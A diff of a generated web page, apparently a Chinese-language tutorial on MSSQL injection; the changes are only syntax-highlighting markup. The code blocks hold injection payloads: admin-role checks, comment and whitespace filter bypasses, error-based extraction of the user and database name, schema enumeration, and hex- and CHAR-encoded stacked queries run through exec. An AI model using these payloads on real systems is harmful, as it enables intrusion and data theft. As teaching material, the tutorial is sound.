@@ -222,8 +222,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>查询所有数据库的名称。</p>
 <h3 id="12-字段介绍">1.2 字段介绍</h3>
@@ -232,8 +232,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">xtype</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sysobjects</span><span class="p">;</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">xtype</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sysobjects</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>xtype 可以是下列对象类型中的一种：</p>
 <ul>
@@ -314,13 +314,13 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">))</span><span class="w">
-</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;serveradmin&#39;</span><span class="p">))</span><span class="w">
-</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;setupadmin&#39;</span><span class="p">))</span><span class="w">
-</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;securityadmin&#39;</span><span class="p">))</span><span class="w">
-</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;diskadmin&#39;</span><span class="p">))</span><span class="w">
-</span><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;bulkadmin&#39;</span><span class="p">))</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;serveradmin&#39;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;setupadmin&#39;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;securityadmin&#39;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;diskadmin&#39;</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">&#39;bulkadmin&#39;</span><span class="p">))</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 SQLMap 中使用 &ndash;is-dba 命令可以判断是否为管理员权限</p>
 <div class="highlight"><div class="chroma">
@@ -328,8 +328,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">select * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)))
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)))
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="212-数据库级别的角色">2.1.2 数据库级别的角色</h4>
 <p><code>select IS_MEMBER('db_owner')  </code></p>
@@ -350,11 +350,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">@@version // 数据库版本
-user  //获取当前数据库用户名
-db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库
-;select user //查询是否支持多语句
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@@version // 数据库版本
+</span></span><span class="line"><span class="cl">user  //获取当前数据库用户名
+</span></span><span class="line"><span class="cl">db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库
+</span></span><span class="line"><span class="cl">;select user //查询是否支持多语句
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="23-判断站库分离">2.3 判断站库分离</h3>
 <div class="highlight"><div class="chroma">
@@ -362,8 +362,8 @@ db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">host_name</span><span class="p">()</span><span class="o">=@@</span><span class="n">servername</span><span class="p">;</span><span class="c1">--&#39;
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">host_name</span><span class="p">()</span><span class="o">=@@</span><span class="n">servername</span><span class="p">;</span><span class="c1">--&#39;
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>最简单的方法，当然你可以调用 xp_cmdshell 就可以通过 cmd 来判断。</p>
 <p>通过简单的判断数据库版本，当前用户权限，我们就可以想下一步怎么去做，比如 2005 的 xp_cmdshell 的权限一般是 system 而 2008 的权限一般是 <code>ntauthority\network service</code></p>
@@ -376,10 +376,10 @@ db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/*
--- 
-;%00
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/*
+</span></span><span class="line"><span class="cl">-- 
+</span></span><span class="line"><span class="cl">;%00
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="32-空白字符">3.2 空白字符</h3>
 <div class="highlight"><div class="chroma">
@@ -389,10 +389,10 @@ db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
-
-/**/
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/**/
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="33-运算符号">3.3 运算符号</h3>
 <div class="highlight"><div class="chroma">
@@ -429,37 +429,37 @@ db_name() // 当前数据库名 其中db_name(N)可以来遍历其他数据库
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">+   加法运算
--   减法运算
-*   乘法运算
-/   除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去
-%   取模运算，返回两数相除后的余数
-
-&amp;   位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0
-|   位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0
-^   位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为0
-
-=   等于 
-&lt;&gt;  不等于
-&gt;   大于  
-!=  不等于
-&lt;   小于  
-!&lt;  不小于
-&gt;=  大于或等于   
-!&gt;  不大于
-&lt;=  小于或等于
-
-ALL 如果一组的比较都为 true，则比较结果为 true
-AND 如果两个布尔表达式都为 true，则结果为 true；如果其中一个表达式为 false，则结果为 false
-ANY 如果一组的比较中任何一个为 true，则结果为 true
-BETWEEN 如果操作数在某个范围之内，那么结果为 true
-EXISTS  如果子查询中包含了一些行，那么结果为 true
-IN  如果操作数等于表达式列表中的一个，那么结果为 true
-LIKE    如果操作数与某种模式相匹配，那么结果为 true
-NOT 对任何其他布尔运算符的结果值取反
-OR  如果两个布尔表达式中的任何一个为 true，那么结果为 true
-SOME    如果在一组比较中，有些比较为 true，那么结果为 true
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+   加法运算
+</span></span><span class="line"><span class="cl">-   减法运算
+</span></span><span class="line"><span class="cl">*   乘法运算
+</span></span><span class="line"><span class="cl">/   除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去
+</span></span><span class="line"><span class="cl">%   取模运算，返回两数相除后的余数
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&amp;   位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为 1 时，结果中的位才被设置为 1，否则，结果中的位被设置为 0
+</span></span><span class="line"><span class="cl">|   位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为 1 时，结果的位就被设置为 1，只有当两个位的值都为 0 时，结果中的位才被设置为 0
+</span></span><span class="line"><span class="cl">^   位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为 1 时，结果中的位就被设置为 1；只有当两个位的值都为 0 或 1 时，结果中的位才被设置为0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=   等于 
+</span></span><span class="line"><span class="cl">&lt;&gt;  不等于
+</span></span><span class="line"><span class="cl">&gt;   大于  
+</span></span><span class="line"><span class="cl">!=  不等于
+</span></span><span class="line"><span class="cl">&lt;   小于  
+</span></span><span class="line"><span class="cl">!&lt;  不小于
+</span></span><span class="line"><span class="cl">&gt;=  大于或等于   
+</span></span><span class="line"><span class="cl">!&gt;  不大于
+</span></span><span class="line"><span class="cl">&lt;=  小于或等于
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ALL 如果一组的比较都为 true，则比较结果为 true
+</span></span><span class="line"><span class="cl">AND 如果两个布尔表达式都为 true，则结果为 true；如果其中一个表达式为 false，则结果为 false
+</span></span><span class="line"><span class="cl">ANY 如果一组的比较中任何一个为 true，则结果为 true
+</span></span><span class="line"><span class="cl">BETWEEN 如果操作数在某个范围之内，那么结果为 true
+</span></span><span class="line"><span class="cl">EXISTS  如果子查询中包含了一些行，那么结果为 true
+</span></span><span class="line"><span class="cl">IN  如果操作数等于表达式列表中的一个，那么结果为 true
+</span></span><span class="line"><span class="cl">LIKE    如果操作数与某种模式相匹配，那么结果为 true
+</span></span><span class="line"><span class="cl">NOT 对任何其他布尔运算符的结果值取反
+</span></span><span class="line"><span class="cl">OR  如果两个布尔表达式中的任何一个为 true，那么结果为 true
+</span></span><span class="line"><span class="cl">SOME    如果在一组比较中，有些比较为 true，那么结果为 true
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="34-语法定义符号">3.4 语法定义符号</h3>
 <div class="highlight"><div class="chroma">
@@ -475,16 +475,16 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL 语言的非终结符。
-
-::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。
-
-[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。
-
-{ } 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。
-
-() 括号是分组运算符
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt; &gt; 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL 语言的非终结符。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{ } 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">() 括号是分组运算符
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4-mssql-注入">4 MSSQL 注入</h2>
 <h3 id="41-显错注入">4.1 显错注入</h3>
@@ -499,12 +499,12 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="c1">--
-</span><span class="c1"></span><span class="w">
-</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="o">|</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="c1">--
-</span><span class="c1"></span><span class="w">
-</span><span class="w"></span><span class="err">在将</span><span class="w"> </span><span class="n">nvarchar</span><span class="w"> </span><span class="err">值</span><span class="w"> </span><span class="s1">&#39;dbo&#39;</span><span class="w"> </span><span class="err">转换成数据类型</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="err">时失败。</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="o">|</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">)</span><span class="c1">--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">在将</span><span class="w"> </span><span class="n">nvarchar</span><span class="w"> </span><span class="err">值</span><span class="w"> </span><span class="s1">&#39;dbo&#39;</span><span class="w"> </span><span class="err">转换成数据类型</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="err">时失败。</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>显示转换也就是利用函数来转换，我们经常用到的两个函数就是 cast 和 convert</p>
 <div class="highlight"><div class="chroma">
@@ -514,10 +514,10 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">CAST</span><span class="p">(</span><span class="k">USER</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">int</span><span class="p">))</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">convert</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span><span class="k">user</span><span class="p">))</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">CAST</span><span class="p">(</span><span class="k">USER</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nb">int</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">convert</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span><span class="k">user</span><span class="p">))</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>判断当前数据库：</strong></p>
 <p><code>id=1'and db_name()&gt;0;--</code></p>
@@ -570,12 +570,12 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w">
-</span><span class="w">
-</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">);</span><span class="c1">--
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">);</span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>要判断当前表名和列名，也可以使用  <code>having 1=1</code>  和  <code>group by</code></p>
 <p><code>id=1 having 1=1</code></p>
@@ -604,8 +604,8 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">a</span><span class="w"> </span><span class="n">nvarchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;select convert(int,@@version)&#39;</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="c1">--
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">a</span><span class="w"> </span><span class="n">nvarchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">a</span><span class="o">=</span><span class="s1">&#39;select convert(int,@@version)&#39;</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="c1">--
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>declare 定义变量，set 设置变量值，exec 执行变量</p>
 <p>变量的值是支持 hex 和 ascii 码的，当过滤引号我们就可以这么用把我们的语句编码一下</p>
@@ -616,10 +616,10 @@ SOME    如果在一组比较中，有些比较为 true，那么结果为 true
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="o">=</span><span class="mi">0</span><span class="n">x73656c65637420636f6e7665727428696e742c404076657273696f6e29</span><span class="w"> </span><span class="k">exec</span><span class="p">(</span><span class="o">@</span><span class="n">s</span><span class="p">)</span><span class="c1">--
-</span><span class="c1"></span><span class="w">
-</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">admin</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">declare</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="o">@</span><span class="n">s</span><span class="o">=</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span class="mi">115</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">CHAR</span><span class="p">(</span><span 